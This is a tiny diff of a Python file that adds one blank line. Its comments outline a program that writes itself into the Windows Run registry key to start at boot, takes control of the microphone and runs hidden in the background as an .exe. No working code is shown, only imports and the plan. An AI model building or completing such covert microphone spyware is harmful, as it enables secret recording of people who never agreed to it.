@@ -5,6 +5,7 @@ import os
 from datetime import datetime
 import _winreg as reg
 
+
 # First: inject the program in the run windows registry, so it runs at boot
 # Second: create the program that takes control over the mic
 # Third: create the program .exe and make it run in background
